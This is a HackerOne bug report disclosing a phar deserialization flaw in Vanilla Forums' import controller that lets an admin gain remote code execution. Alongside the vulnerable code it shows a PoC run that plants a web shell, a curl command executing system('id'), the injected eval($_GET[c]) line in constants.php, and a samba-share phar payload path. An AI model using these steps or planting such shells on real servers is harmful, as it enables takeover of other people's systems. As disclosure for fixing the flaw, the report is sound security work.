@@ -1,0 +1,173 @@
+ReportLink:https://hackerone.com/reports/410237
+WeaknessName:Deserialization of Untrusted Data
+Reporter:https://hackerone.com/mr_me
+ReportedTo:Vanilla(vanilla)
+BountyAmount:600.0
+Severity:critical
+State:Closed
+DateOfDisclosure:23.11.2018 15:45:43
+
+Summary:
+
+## Summary:
+
+An authenticated admin user can inject an serialized payload into a phar archive and trigger read access to it via an unprotected file_exists(). An attacker
+can leverage this to deserialize untrusted data and gain remote code execution.
+
+## Notes:
+
+- You need to have an admin account to run this poc.
+- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html
+- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!
+- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Winodws, you could use a samba share. I have tested this and its proved to be working 100%.
+  The payload would look like phar:////attacker-share/share/poc.jpg
+- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.
+
+## Analysis:
+
+Inside of applications/dashboard/controllers/class.importcontroller.php we can see the following code
+
+```
+class ImportController extends DashboardController {
+
+    ...
+
+    public function index() {
+        $this->permission('Garden.Import'); // This permission doesn't exist, so only users with Admin == '1' will succeed.
+        $timer = new Gdn_Timer();
+
+        // Determine the current step.
+        $this->Form = new Gdn_Form();
+        $imp = new ImportModel();
+        $imp->loadState();
+
+        // Search for the list of acceptable imports.
+        $importPaths = [];
+        $existingPaths = safeGlob(PATH_UPLOADS.'/export*', ['gz', 'txt']);
+        $existingPaths2 = safeGlob(PATH_UPLOADS.'/porter/export*', ['gz']);
+        $existingPaths = array_merge($existingPaths, $existingPaths2);
+        foreach ($existingPaths as $path) {
+            $importPaths[$path] = basename($path);
+        }
+        // Add the database as a path.
+        $importPaths = array_merge(['db:' => t('This Database')], $importPaths);
+
+        if ($imp->CurrentStep < 1) {
+            // Check to see if there is a file.
+            $importPath = c('Garden.Import.ImportPath');
+            $validation = new Gdn_Validation();
+
+
+            if (Gdn::request()->isAuthenticatedPostBack(true)) {
+                $upload = new Gdn_Upload();
+                $validation = new Gdn_Validation();
+                if (count($importPaths) > 0) {
+                    $validation->applyRule('PathSelect', 'Required', t('You must select a file to import.'));
+                }
+
+                if (count($importPaths) == 0 || $this->Form->getFormValue('PathSelect') == 'NEW') {                 // 1
+                    $tmpFile = $upload->validateUpload('ImportFile', false);
+                } else {
+                    $tmpFile = '';
+                }
+
+                if ($tmpFile) {
+                    $filename = $_FILES['ImportFile']['name'];
+                    $extension = pathinfo($filename, PATHINFO_EXTENSION);
+                    $targetFolder = PATH_ROOT.DS.'uploads'.DS.'import';
+                    if (!file_exists($targetFolder)) {
+                        mkdir($targetFolder, 0777, true);
+                    }
+                    $importPath = $upload->generateTargetName(PATH_ROOT.DS.'uploads'.DS.'import', $extension);
+                    $upload->saveAs($tmpFile, $importPath);
+                    $imp->ImportPath = $importPath;
+                    $this->Form->setFormValue('PathSelect', $importPath);
+
+                    $uploadedFiles = val('UploadedFiles', $imp->Data);
+                    $uploadedFiles[$importPath] = basename($filename);
+                    $imp->Data['UploadedFiles'] = $uploadedFiles;
+                } elseif (($pathSelect = $this->Form->getFormValue('PathSelect'))) {                                // 2
+                    if ($pathSelect == 'NEW') {
+                        $validation->addValidationResult('ImportFile', 'ValidateRequired');
+                    } else {
+                        $imp->ImportPath = $pathSelect;                                                             // 3
+                    }
+                } elseif (!$imp->ImportPath && count($importPaths) == 0) {
+                    // There was no file uploaded this request or before.
+                    $validation->addValidationResult('ImportFile', $upload->Exception);
+                }
+
+                // Validate the overwrite.
+                if (true || strcasecmp($this->Form->getFormValue('Overwrite'), 'Overwrite') == 0) {
+                    if (!stringBeginsWith($this->Form->getFormValue('PathSelect'), 'Db:', true)) {
+                        $validation->applyRule('Email', 'Required');
+                    }
+                }
+
+                if ($validation->validate($this->Form->formValues())) {
+                    $this->Form->setFormValue('Overwrite', 'overwrite');
+                    $imp->fromPost($this->Form->formValues());
+                    $this->View = 'Info';
+                } else {
+                    $this->Form->setValidationResults($validation->results());
+                }
+            } else {
+                $this->Form->setFormValue('PathSelect', $imp->ImportPath);
+            }
+            $imp->saveState();
+        } else {
+            $this->setData('Steps', $imp->steps());
+            $this->View = 'Info';
+        }
+
+        if (!stringBeginsWith($imp->ImportPath, 'db:') && !file_exists($imp->ImportPath)) {                         // 4
+            $imp->deleteState();
+        }
+```
+
+At [1], we make sure our `PathSelect` is not set as "NEW". Then at [2] the code sets the `$pathSelect` variable from attacker controlled input. At [3] the code sets the `$imp->ImportPath` variable to the attackers fully controlled string. Finally at [4] we reach a file_exists() call with attacker controlled input, leading to deserialization inside of the phar archive.
+
+## Exploitation:
+
+In my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums.The payload would look like phar:////attacker-share/share/poc.phar/.jpg
+
+## Example:
+
+The following steps are used to re-create the vulnerability:
+
+1. We create our phar file:
+
+`saturn:~ mr_me$ php poc-stage-1.php`
+
+2. We run the poc-stage-2.py which will trigger the bug
+
+```
+saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123
+(+) targeting: http://172.16.175.143
+(+) logged in!
+(+) uploaded phar!
+(+) leaked phar name!
+(+) triggered a write!
+(+) shell at: http://172.16.175.143/?c=phpinfo();
+
+saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Now, on the victim box:
+
+```
+steven@pluto:/var/www/html/conf$ cat constants.php 
+<?php if (!defined('APPLICATION')) exit();
+$a=eval($_GET[c]);//[''] = '';
+
+// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$
+```
+
+## References:
+
+- https://rdot.org/forum/showthread.php?t=4379
+
+## Impact
+
+An authenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.
